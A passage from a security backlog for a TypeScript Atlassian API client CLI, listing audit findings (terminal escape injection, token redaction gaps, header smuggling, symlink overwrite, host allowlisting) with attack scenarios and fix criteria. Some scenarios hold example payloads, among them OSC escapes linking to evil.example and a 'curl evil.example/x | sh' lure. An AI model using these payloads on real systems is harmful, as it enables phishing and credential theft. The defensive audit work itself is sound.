  - [ ] Unit test: small response (`< maxResponseBytes`) passes through unchanged.
  - [ ] Unit test: streaming mode is unaffected.
- **Files:** `src/core/response.ts`, `src/core/config.ts`, `src/core/errors.ts`, `src/core/types.ts`, `test/core/response.test.ts`
- **Dependencies:** None

### [x] B027: Terminal escape-sequence injection via Atlassian-controlled content in `printTable` / `printMinimal`

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). New `sanitizeForTerminal` helper replaces C0/DEL/C1 controls with `\xNN` literals when stdout is a TTY; piped output preserves raw bytes for log fidelity. Applied to `printTable`, `printMinimal`, and `printError` ([[B032]]).

- **Priority:** P1 — High
- **Severity:** Medium — terminal hijack, clipboard / OSC-8 phishing, session-token disclosure on misbehaved emulators
- **Description:** `printTable` and `printMinimal` (`src/cli/output.ts:22-94`) coerce arbitrary API response fields to strings via `String(value)` and write them straight to `process.stdout` with no control-character sanitisation. Atlassian content fields (issue summary, comment body, page title, attachment filename, custom field strings, etc.) are user-controlled and reach the terminal verbatim. An attacker who can put text into the Atlassian instance the operator queries can embed ANSI/OSC escape sequences that:
  - clear the screen and re-print spoofed prompts (`\x1b[2J\x1b[H`) — tricking the operator into running malicious commands;
  - rewrite the terminal title (`\x1b]0;…\x07`);
  - install OSC-8 hyperlinks (`\x1b]8;;https://evil.example/\x07…\x1b]8;;\x07`) that look like a benign label but click through to an attacker URL;
  - on iTerm2 / xterm with permissive settings, trigger image download or clipboard manipulation escapes;
  - exfiltrate data by combining DCS/CSI report sequences with terminals that echo replies into the next command.
- **Attack scenario:**
  1. Attacker creates a Jira issue with summary `"\x1b]8;;https://evil.example/\x07Click me\x1b]8;;\x07"` (or any control-char-laden payload).
  2. Operator runs `atlas jira issues list --format table`.
  3. Terminal renders the OSC-8 hyperlink (or executes the escape) silently.
- **Acceptance criteria:**
  - [ ] Introduce `sanitizeForTerminal(s: string): string` that strips/escapes C0 controls (0x00–0x1F except `\t`, `\n`), DEL (0x7F), and C1 controls (0x80–0x9F).
  - [ ] Apply it to every value emitted by `printTable`, `printMinimal`, and the `default` arm of `printOutput` (JSON output via `JSON.stringify` already escapes `\x00`–`\x1F`, but document that callers piping to a terminal should still pass through the sanitiser).
  - [ ] Make sanitisation no-op when stdout is NOT a TTY (`process.stdout.isTTY === false`) so logs piped to files retain fidelity.
  - [ ] Unit test: API row containing `"\x1b]0;pwned\x07"` is rendered as the literal escaped form (or stripped) when stdout is a TTY.
  - [ ] Unit test: non-TTY output retains the raw bytes.
  - [ ] Unit test: legitimate Unicode (CJK, emoji, RTL marks) is preserved.
- **Files:** `src/cli/output.ts`, `test/cli/output.test.ts`
- **Dependencies:** None

### [ ] B028: Partial credential leak in `formatBodySnippet` due to escaped-quote handling

- **Priority:** P2 — Medium
- **Severity:** Medium — secret material leaks into error messages / logs
- **Description:** `formatBodySnippet` in `src/core/oauth.ts:195-204` redacts `access_token` / `refresh_token` / `id_token` / `client_secret` in the body snippet using the regex `/("(?:…)"\s*:\s*")[^"]*(")/gi`. The `[^"]*` capture stops at the FIRST quote character, including escaped quotes (`\"`) that are valid inside a JSON string. When a token-endpoint failure body contains a token with an embedded escaped quote — which is unusual but legal JSON — the redaction stops mid-token, leaving the suffix in the cleartext snippet that gets attached to the `OAuthError` message and ultimately logged.
- **Attack scenario:**
  1. Compromised IdP / token-endpoint proxy responds 400 with body `{"error":"x","access_token":"abc\"DEF_LEAKED_PART\""}`.
  2. `formatBodySnippet` regex matches `"access_token":"abc"` and replaces middle with `***`, output is `"access_token":"***"DEF_LEAKED_PART\""`.
  3. The leaked suffix lands in `OAuthError.message`, which is later logged or surfaced to the caller.
- **Acceptance criteria:**
  - [ ] Replace the regex-based redaction with a structural pass: `JSON.parse` the body (when possible), walk the object, replace known-sensitive keys with `***`, then `JSON.stringify` the result for the snippet.
  - [ ] Fall back to a stricter regex that consumes escaped quotes (`(?:\\.|[^"\\])*`) only when JSON parsing fails.
  - [ ] Extend the sensitive-key list (case-insensitive): `password`, `client_secret`, `private_key`, `assertion`, `Authorization`.
  - [ ] Cap snippet to 200 chars AFTER redaction (current behaviour) but ensure the cut never lands inside an opened `"…` redaction marker.
  - [ ] Unit test: token containing `\"` is fully redacted.
  - [ ] Unit test: non-JSON body falls back to regex redaction without throwing.
  - [ ] Unit test: nested `{"data":{"access_token":"…"}}` is redacted.
- **Files:** `src/core/oauth.ts`, `test/core/oauth.test.ts`
- **Dependencies:** None

### [x] B029: `buildHeaders` strips caller `Authorization` but lets `Cookie` / `Proxy-Authorization` / other auth-bearing headers pass through

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `buildHeaders` now strips `Authorization`, `Proxy-Authorization`, `Cookie`, `Set-Cookie`, and `X-Atlassian-WebSudo` (all case-insensitive). Legitimate headers like `X-Atlassian-Token: no-check` (for attachment uploads) still pass through.

- **Priority:** P1 — High
- **Severity:** Medium — auth confusion / session injection / proxy credential smuggling
- **Description:** `buildHeaders` (`src/core/request.ts:89-109`) deliberately filters out caller-supplied `Authorization` so a misconfigured caller cannot override the configured auth. However, it does NOT filter `Cookie`, `Proxy-Authorization`, `WWW-Authenticate`, `X-Atlassian-WebSudo`, or any other header that carries credentials. A caller (or a middleware) that injects a `Cookie: cloud.session.token=…` header will authenticate the request with the cookie's identity, which Atlassian's browser-context REST endpoints may honour in preference to the `Authorization` header. This breaks the documented invariant that "the configured `auth` is the only identity the transport speaks as," and creates a session-injection vector when the transport is shared across trust boundaries.
- **Attack scenario:**
  1. Multi-tenant server uses one `HttpTransport` with `auth = { type: 'bearer', token: serverServiceToken }`.
  2. Per-request middleware (e.g. a logging middleware that copies forwarded headers) attaches the inbound request's `Cookie` header to `options.headers`.
  3. The transport sends `Authorization: Bearer <service>` AND `Cookie: cloud.session.token=<attacker>`.
  4. Atlassian's API treats the request as the cookie's identity → privilege confusion.
- **Acceptance criteria:**
  - [ ] `buildHeaders` strips, case-insensitively: `Authorization`, `Proxy-Authorization`, `Cookie`, `Set-Cookie`, `X-Atlassian-WebSudo`, plus any header listed in a new `ResolvedConfig.forbiddenCallerHeaders?: readonly string[]`.
  - [ ] Document that callers MUST NOT pass auth-bearing headers via `RequestOptions.headers`; supported channels are `config.auth` and explicit middleware.
  - [ ] Unit test: caller `Cookie` is dropped; `X-Atlassian-Token: no-check` (legitimate XSRF bypass for upload) is preserved.
  - [ ] Unit test: caller `Proxy-Authorization` is dropped.
  - [ ] Unit test: caller-supplied custom header `X-Trace-Id` passes through unchanged.
- **Files:** `src/core/request.ts`, `src/core/config.ts`, `src/core/types.ts`, `test/core/request.test.ts`
- **Dependencies:** None

### [x] B030: Symlink / TOCTOU attack on `atlas install-skill --force` overwrites arbitrary user-writable files

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `runInstall` now calls `lstatSync` before each write: without `--force` a pre-planted symlink causes a hard error (exit code 2); with `--force` the symlink itself is unlinked and replaced with a regular file — the symlink's target is never written through.

- **Priority:** P1 — High
- **Severity:** Medium — arbitrary file overwrite within the invoking user's privileges
- **Description:** `runInstall` in `src/cli/commands/install-skill.ts:202-213` iterates over the bundled skill files and writes each one with `writeFileSync(dest, …)` after calling `mkdirSync(dirname(dest))`. Neither call uses `O_NOFOLLOW` (Node's `fs.writeFileSync` does not expose this flag, and the install path makes no `lstatSync` check) so any symlink at `dest` is silently followed and the symlink's target is overwritten with the bundled file contents. The `--force` flag and the existence check at `src/cli/commands/install-skill.ts:172-189` only inspect `SKILL.md` for an idempotency match; once the loop reaches a different file (`scripts/foo.md`, etc.) the symlink-follow happens unconditionally.
- **Attack scenario:**
  1. A malicious package or a previous co-tenant on a shared developer host pre-plants a symlink: `~/.claude/skills/atlassian-api-client-cli/SKILL.md → ~/.ssh/authorized_keys` (or any user-writable file).
  2. The operator runs `atlas install-skill --force` (the `--force` is plausible after a routine upgrade).
  3. `writeFileSync` follows the symlink and overwrites `~/.ssh/authorized_keys` with the stamped `SKILL.md` text — a no-op for SSH but a destructive overwrite for any other target (e.g. `~/.config/git/config`, `~/.npmrc`).
  4. With `~/.npmrc` overwritten, the attacker can also bait the operator into running install-skill against `~/.config/<critical config>` to wipe configuration that protects the user (CSP for an Electron app, allowed registries, etc.).
- **Acceptance criteria:**
  - [ ] Before each `writeFile`, `lstatSync(dest)` is called and the install refuses (or, with `--force`, unlinks first) any path that is a symlink.
  - [ ] `realpathSync(dirname(dest))` must resolve under `options.target`; otherwise throw `InstallSkillError('Refusing to write outside install target', 1)`.
  - [ ] Add a regression test that pre-creates `dest` as a symlink to a temp file and asserts the install refuses (or unlinks, then writes) but never overwrites the symlink target.
  - [ ] Document that `--force` does NOT bypass the symlink check; users must remove the symlink manually.
- **Files:** `src/cli/commands/install-skill.ts`, `test/cli/commands/install-skill.test.ts`
- **Dependencies:** None

### [ ] B031: Stale hardcoded `VERSION` in the CLI obscures patch level and breaks vulnerability reporting

- **Priority:** P2 — Medium
- **Severity:** Low (security-relevant, not directly exploitable)
- **Description:** `src/cli/index.ts:11` declares `const VERSION = '0.1.0'` and `main()` prints it for `--version`, while `package.json:3` is at `0.7.0`. The `install-skill` command already reads the real version at runtime via `resolvePackageVersion` (`src/cli/commands/install-skill.ts:59-76`), so the divergence here is a maintenance miss. The practical consequence is that users running `atlas --version` cannot determine whether they have a patched build, which directly undermines vulnerability disclosure workflows (operators cannot reliably check "are you on ≥ X.Y.Z that fixed CVE-…?"). Forensic investigations after a token-leak incident (cf. B021) are also blocked because shell history of `atlas --version` reports a misleading string.
- **Acceptance criteria:**
  - [ ] `src/cli/index.ts` reads the version from `package.json` at runtime (reusing or extracting `resolvePackageVersion` from `install-skill.ts`).
  - [ ] Remove the `const VERSION` constant entirely so it cannot drift again.
  - [ ] Add a smoke test that runs `node dist/cli/index.js --version` and asserts the output equals `package.json`'s version.
  - [ ] CI step: fail the build if any hardcoded version literal matching `/\bVERSION\s*=\s*['"]\d+\.\d+\.\d+/` appears outside `package.json`.
- **Files:** `src/cli/index.ts`, `src/cli/commands/install-skill.ts` (refactor `resolvePackageVersion` to shared helper), `test/cli/version.test.ts` (new)
- **Dependencies:** None

### [x] B032: Server-controlled error messages reach stderr unsanitised → terminal-escape injection via API error path

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `printError` now runs `sanitizeForTerminal` on the message when stderr is a TTY ([[B027]]). `extractErrorMessage` caps the assembled message at 1 KiB with a trailing ellipsis so a hostile `errorMessages` array cannot blow up logs or heap.

- **Priority:** P1 — High
- **Severity:** Medium — terminal hijack via the error path, bypasses the JSON-mode mitigation considered for B027
- **Description:** `extractErrorMessage` (`src/core/errors.ts:199-220`) extracts the error message from server-controlled `body.errorMessages` (Jira format) or `body.message` (generic) and feeds it to `new HttpError(message, …)` so that `error.message` carries the raw server text. The top-level CLI handler `main().catch` (`src/cli/index.ts:56-60`) prints that message via `printError`, which writes `Error: <message>\n` to `stderr` with no control-character filtering (`src/cli/output.ts:97-99`). Even when the operator selected `--format json` (so stdout is JSON-safe), the error path bypasses any future stdout sanitiser. A server-controlled error string containing OSC-8 / DCS / CSI escapes hijacks the operator's terminal exactly as in B027 — but reaches the terminal even on the failure branch when no successful payload is rendered.
- **Attack scenario:**
  1. Attacker triggers a Jira validation error whose `errorMessages` contains `"\x1b]0;system-update-required\x07Server says: please run curl evil.example/x | sh"`.
  2. Operator runs `atlas jira issues create --project PROJ --type Bug --summary 'x'` (any failing call).
  3. The 4xx response is parsed, the message reaches `HttpError.message`, propagates to `main().catch`, and `printError` writes the raw bytes to stderr.
  4. The operator's terminal title is hijacked and a fake admin-looking message is rendered.
- **Acceptance criteria:**
  - [ ] `printError` sanitises C0 (0x00–0x1F except `\t`, `\n`), DEL (0x7F), and C1 controls (0x80–0x9F) when stderr is a TTY.
  - [ ] `extractErrorMessage` also caps the assembled message at 1 KiB so a hostile array of error messages cannot produce a multi-megabyte `error.message` (related to B026 mass-allocation).
  - [ ] Unit test: API error with OSC-laden `errorMessages` is rendered as escaped literals on a TTY stderr.
  - [ ] Unit test: piping stderr to a file preserves the raw bytes.
  - [ ] Cross-reference with B027 — share the same `sanitizeForTerminal` helper.
- **Files:** `src/cli/output.ts`, `src/core/errors.ts`, `test/cli/output.test.ts`, `test/core/errors.test.ts`
- **Dependencies:** B027 (share sanitiser)

### [x] B033: `DashboardsResource.listAll` hand-rolled pagination loops forever on `total: undefined`

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `listAll` now accepts a `{ maxPages, logger }` option (default cap 10 000) and emits a single `logger.warn` once the page count crosses 80% of the cap. Existing exit conditions (empty page, total reached) are preserved.

- **Priority:** P1 — High
- **Severity:** Medium — availability (unbounded iteration / memory exhaustion)
- **Description:** `DashboardsResource.listAll` (`src/jira/resources/dashboards.ts:124-139`) reimplements offset pagination locally instead of delegating to `paginateOffset`. The exit condition is `page.values.length === 0 || (page.total !== undefined && startAt + maxResults >= page.total)`. None of the other safety guards present in `paginateOffset` (`src/core/pagination.ts:240-305`) are applied: no `maxPages` cap, no `isLast === true` short-circuit, and no short-page check (`values.length < maxResults` → done). A server that returns a full-size page with `total: undefined` on every response causes the consumer to iterate forever, accumulating memory if results are buffered downstream and burning CPU + network indefinitely.
- **Attack scenario:**
  1. Hostile Atlassian-shaped endpoint (rogue self-hosted instance, malicious reverse proxy) returns 200 with `{ dashboards: [<50 items>], startAt, maxResults: 50, total: undefined }` for every page.
  2. Consumer calls `for await (const d of client.dashboards.listAll())` to enumerate dashboards before a UI render.
  3. Loop never terminates — process drowns in network requests and (if the consumer accumulates) heap pressure.
- **Acceptance criteria:**
  - [ ] Rewrite `listAll` to delegate to `paginateOffset` (the response is already in `OffsetPaginatedResponse<Dashboard>` shape).
  - [ ] If delegation isn't viable, port the three missing guards: `isLast === true`, short-page detection, and a `maxPages` cap (default 10 000 to match `DEFAULT_MAX_PAGES`).
  - [ ] Audit `src/**/resources/**.ts` for any other hand-rolled pagination loops (`while (true)` / `while (!done)`) and either delegate or add the guards.
  - [ ] Unit test: server returning full pages with `total: undefined` causes `listAll` to terminate after `maxPages` with a logged warning, not loop forever.
  - [ ] Unit test: legitimate pagination with `total` defined still terminates correctly.
- **Files:** `src/jira/resources/dashboards.ts`, `test/jira/resources/dashboards.test.ts`
- **Dependencies:** None

### [x] B034: `validateConfig` accepts ANY HTTPS host — no Atlassian domain allowlist amplifies the B021 credential-leak surface

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `validateConfig` rejects non-Atlassian `baseUrl` by default (suffixes: `.atlassian.net`, `.atlassian.com`, `.jira-dev.com`, `.jira.com`). Self-hosted / proxy / test setups opt in via `ClientConfig.allowedHosts`. `ResolvedConfig.allowedHosts` is consumed by `buildUrl` ([[B021]]).

- **Priority:** P1 — High
- **Severity:** Medium — configuration-driven credential disclosure when combined with B021
- **Description:** `validateConfig` (`src/core/config.ts:38-87`) enforces only that `baseUrl` is a syntactically valid URL with `protocol === 'https:'`. There is no allowlist of Atlassian-managed domains. Any HTTPS URL passes — `https://evil.example/`, `https://victim-look-alike.atlassian.net.attacker.example/`, an internal proxy under attacker control, etc. Once the misconfigured `baseUrl` is set, every resource call constructs `${baseUrl}/rest/api/3/...` and the transport happily attaches the `Authorization` header (basic or bearer) to the misconfigured host. This is the same credential-attached-to-foreign-host pattern as B021, but reached through the front-door configuration path: a typo in an environment variable (`ATLASSIAN_BASE_URL=https://evi.atlassian.net.example`) or a poisoned config file is sufficient to leak the operator's API token on the very first request.
- **Attack scenario:**
  1. Attacker compromises a CI secret store (or social-engineers a config-file PR) and sets `ATLASSIAN_BASE_URL=https://attacker.example` while leaving `ATLASSIAN_API_TOKEN` untouched.
  2. The next scheduled `atlas jira issues list` (or library call) sends `Authorization: Basic <base64(email:token)>` to `attacker.example`.
  3. Attacker harvests credentials and pivots to the real Atlassian instance with full API access.
- **Acceptance criteria:**
  - [ ] `validateConfig` adds a domain check: by default, the URL's `host` must end in one of `.atlassian.net`, `.atlassian.com`, `.jira-dev.com`, or `.jira.com`. Reject otherwise with a `ValidationError` that lists the accepted suffixes.
  - [ ] Provide an explicit escape hatch `ClientConfig.allowedHosts?: readonly string[]` for self-hosted / proxy / test setups; when provided, it REPLACES the default allowlist.
  - [ ] Document the rationale (defence-in-depth for B021) inline so future maintainers don't relax it.
  - [ ] Unit test: `baseUrl: 'https://evil.example'` throws by default, passes when `allowedHosts` includes it.
  - [ ] Unit test: `baseUrl: 'https://mycompany.atlassian.net'` passes by default.
  - [ ] Unit test: a sneaky host like `https://atlassian.net.evil.example` is REJECTED (suffix check, not substring).
- **Files:** `src/core/config.ts`, `src/core/types.ts`, `test/core/config.test.ts`
- **Dependencies:** Complements B021 (each closes the gap from a different direction)

### [ ] B035: `sanitizePathForLogging` redaction has narrow coverage — common credential markers leak into debug logs

- **Priority:** P2 — Medium
- **Severity:** Low–Medium — credential disclosure into log aggregators when debug logging is enabled
- **Description:** `sanitizePathForLogging` (`src/core/request.ts:35-69`) redacts a path segment only when its predecessor is exactly `'token'`, `'key'`, `'secret'`, or `'auth'` (case-insensitive), and rewrites `key=value` markers only for the same four keywords. Real-world credential-bearing path patterns that escape this filter include:
  - `Authorization`, `bearer`, `password`, `pwd`, `pass`, `passwd`, `api_key`, `apitoken`, `accesstoken`, `refreshtoken`, `client_secret`, `sessionid`, `jsessionid`, `cookie` (none of these match the four exact-string set).
  - URL-encoded delimiters: `token%3Dabc` (where `%3D` is `=`) is never matched by the `token=([^/&]+)` regex.
  - Snake-case / camelCase variants (`access_token`, `accessToken`, `refresh_token`, `refreshToken`) — even though the OAuth flow emits exactly these field names, the path redactor does not know them.
  - `Bearer` prefix in a path segment (`/Bearer/eyJ…`) — the previous segment is `Bearer`, which is not in the set.
- **Attack scenario:**
  1. A consumer (or a third-party middleware) routes through a URL like `/some/redirect?access_token=eyJabc…` or `/Bearer/eyJabc…`.
  2. `HttpTransport.executeFetch` calls `sanitizePathForLogging` and emits the result via `logger.debug('HTTP request', { method, path })`.
  3. The redaction misses the bearer/access-token marker; the cleartext credential lands in the log aggregator (Datadog, Splunk, CloudWatch).
  4. Anyone with log-read access now has a valid API token.
- **Acceptance criteria:**
  - [ ] Expand `SENSITIVE_SEGMENT_NAMES` to include (lowercased): `authorization`, `bearer`, `password`, `pwd`, `pass`, `passwd`, `api_key`, `apikey`, `apitoken`, `accesstoken`, `access_token`, `refreshtoken`, `refresh_token`, `client_secret`, `clientsecret`, `sessionid`, `jsessionid`, `cookie`.
  - [ ] Expand `redactSensitiveMarkers` regex to cover the same expanded list, AND match both `=` and `%3D` (and `:`) as delimiters.
  - [ ] When the path's value-portion of a sensitive marker is longer than 8 characters, prefer redacting to `***` rather than partial preservation.
  - [ ] Add a single source of truth (`SENSITIVE_KEYWORDS`) consumed by both segment and marker redactors.
  - [ ] Unit test: `/Bearer/eyJabc123` → `/Bearer/***`.
  - [ ] Unit test: `?access_token=eyJabc` → `?access_token=***` (or stripped before pathname-only logging).
  - [ ] Unit test: `?token%3Dabc` → redacted.
  - [ ] Unit test: legitimate non-sensitive segments (`/pages/123/labels`) are unchanged.
- **Files:** `src/core/request.ts`, `test/core/request.test.ts`
- **Dependencies:** None

---

## Summary

| Phase                   | Items            | Est. Effort | Priority |
| ----------------------- | ---------------- | ----------- | -------- |
| 0 — Documentation       | B001             | 2h          | P1       |
| 1 — Type correctness    | B002, B003       | 3h          | P0+P1    |
| 2 — Transport refactor  | B004, B005, B006 | 8h          | P0       |
| 3 — Type organization   | B007, B008       | 4h          | P1       |
| 4 — Reliability         | B009, B010, B011 | 10h         | P1+P2    |
| 5 — Testing             | B012, B013, B014 | 12h         | P1+P2    |
| 6 — Security & advanced | B015, B016, B017 | 12h         | P2+P3    |
| 7 — Automation          | B018, B019, B020 | 6h          | P2+P3    |
| 8 — CTF / Security      | B021–B035        | 30h         | P0–P2    |
| **Total**               | **35 items**     | **~87h**    |          |

**Recommended first PR:** B002 + B003 (type correctness, low risk, high impact, independent)
**Recommended second PR:** B004 + B005 + B006 (transport refactor — do together to minimize breakage)
**Recommended third PR:** B007 + B008 (type splits — mechanical, benefits from stable transport)
